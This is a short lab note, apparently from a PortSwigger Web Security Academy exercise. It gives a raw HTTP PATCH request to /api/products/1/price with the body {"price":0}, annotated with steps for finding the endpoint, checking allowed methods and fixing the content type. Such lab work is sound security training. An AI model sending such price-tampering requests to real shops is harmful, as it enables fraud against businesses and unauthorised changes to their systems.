PATCH /api/products/1/price HTTP/2        (first find /api endpoint then try OPTION see allow what PATCH,GET,POST?)

Host: 0ab9003904b7e3498368507800350075.web-security-academy.net

Cookie: session=BwRdpnXkT5PsrTPSLaGRgyX1GtnAmAah

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/json (second saw it show error msg only accept this content-type we add it (rmb no space))

Referer: https://0ab9003904b7e3498368507800350075.web-security-academy.net/product?productId=1

Sec-Fetch-Dest: empty

Sec-Fetch-Mode: cors

Sec-Fetch-Site: same-origin

Te: trailers

Content-Length: 15



{"price":0} (last it show server internal error 500 we inject {} below and skip a line with all header content it show error msg price parameter missing we set price to 0 done)



